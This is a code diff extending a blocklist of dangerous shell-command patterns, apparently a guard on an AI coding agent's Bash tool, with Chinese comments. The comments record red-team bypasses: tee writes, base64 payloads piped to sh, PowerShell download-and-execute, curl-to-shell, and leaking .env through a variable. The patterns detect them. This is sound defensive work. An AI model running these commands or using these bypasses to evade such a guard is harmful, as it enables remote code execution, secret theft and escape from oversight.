@@ -75,8 +75,49 @@ const DANGEROUS_PATTERNS = [
       /node[\s\S]*(?:writeFileSync|writeFile)\([^)]*(?:src|rtl|tb|tests?)[\\/][^)]*\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)/i,
       /(?:Set-Content|Add-Content|Out-File)[\s\S]*(?:src|rtl|tb|tests?)[\\/][^"'\s]+\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)\b/i,
       />>?\s*["']?[^"'\s]*(?:src|rtl|tb|tests?)[\\/][^"'\s]+\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)\b/i,
+      // tee 是重定向的等价物 (2026-07-30 red-team 实测绕过): `echo x | tee src/a.py`
+      // 既不是 > 也不是 Set-Content, 上面几条全部看不到它。
+      /\btee\b(?:\s+-\w+)*\s+["']?[^"'\s]*(?:src|rtl|tb|tests?)[\\/][^"'\s]+\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)\b/i,
     ],
     message: 'Bash 写源码绕过: 请使用 Edit/Write 工具，让写入门禁检查源码变更',
+  },
+
+  // ===== 1c. 编码载荷执行 / 远程代码执行 =====
+  // 2026-07-30 red-team 变体扫描实测绕过 (四条全部为 allow):
+  //   echo <base64> | base64 -d | sh        —— 载荷编码后所有明文模式全部失效
+  //   iex (New-Object Net.WebClient).DownloadString(...)  —— PowerShell 侧无任何 RCE 模式
+  //   curl ... | sh                          —— 经典 pipe-to-shell
+  // 编码/远程取指的共同点是: 真正要执行的东西不在命令文本里, 明文模式天然看不到。
+  // 因此拦的是**取指并执行**这个动作本身, 不是载荷内容。
+  {
+    category: 'encoded-payload-execution',
+    severity: 'CRITICAL',
+    patterns: [
+      // 解码后直接送进 shell / 解释器
+      /\b(?:base64|base32)\b[^|\r\n]*(?:-d|--decode)[^|\r\n]*\|\s*(?:sh|bash|zsh|dash|python\d?|node|perl|ruby)\b/i,
+      /\b(?:xxd\s+-r|od\s+-|certutil\s+(?:-decode|\/decode))\b[^|\r\n]*\|\s*(?:sh|bash|zsh|python\d?|node)\b/i,
+      // PowerShell 的编码命令入口
+      /\bpowershell(?:\.exe)?\b[^\r\n]*-(?:e|ec|enc|encoded|encodedcommand)\b/i,
+      /\[(?:System\.)?Convert\]::FromBase64String[\s\S]*\|\s*(?:iex|Invoke-Expression)\b/i,
+      // 管道进 shell 的 here-string / 变量求值
+      /\becho\s+\$\{?[A-Za-z_][A-Za-z0-9_]*\}?\s*\|\s*(?:sh|bash|zsh)\b/i,
+    ],
+    message: '编码载荷执行: 命令把解码/编码后的内容直接送进 shell, 真实载荷不可审计',
+  },
+
+  {
+    category: 'remote-code-execution',
+    severity: 'CRITICAL',
+    patterns: [
+      // curl/wget 取脚本直接执行 (含 process substitution 形式)
+      /\b(?:curl|wget|Invoke-WebRequest|iwr)\b[^|\r\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|python\d?|node|perl|ruby)\b/i,
+      /\b(?:sh|bash|zsh)\s+(?:-\w+\s+)*<\(\s*(?:curl|wget)\b/i,
+      // PowerShell 下载后求值
+      /\b(?:iex|Invoke-Expression)\b[\s\S]*(?:DownloadString|DownloadFile|Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b/i,
+      /\b(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b[^\r\n]*\|\s*(?:iex|Invoke-Expression)\b/i,
+      /\bNew-Object\s+Net\.WebClient[\s\S]*DownloadString/i,
+    ],
+    message: '远程代码执行: 命令从网络取指后直接执行, 执行内容不在审计范围内',
   },
 
   // ===== 2. 数据泄露 =====
@@ -117,6 +158,11 @@ const DANGEROUS_PATTERNS = [
       // Exfiltration via DNS/exfiltration tools
       /\|\s*curl\s+.*-d\s+@-/i,
       /\|\s*nc\s+.*\d{4,5}\s*/i,
+      // 变量间接引用 (2026-07-30 red-team 实测绕过): `F=.env; curl --data-binary @$F host`
+      // 明文路径被藏进变量, 上面按文件名写的模式全部失效。判据改为
+      // "上传变量内容" + "同一条命令里出现敏感文件名" 的组合。
+      /(?:curl|wget)\b[^\r\n]*(?:--data(?:-binary|-raw)?|--post-file|-d)\s+@?\$\{?[A-Za-z_][A-Za-z0-9_]*\}?[\s\S]*(?:\.env|id_rsa|id_ed25519|credential|\.aws|\.ssh|token|secret)/i,
+      /(?:\.env|id_rsa|id_ed25519|credential|\.aws|\.ssh|token|secret)[\s\S]*(?:curl|wget)\b[^\r\n]*(?:--data(?:-binary|-raw)?|--post-file|-d)\s+@?\$\{?[A-Za-z_][A-Za-z0-9_]*\}?/i,
     ],
     message: '数据泄露检测: 尝试通过管道/文件上传敏感数据',
   },
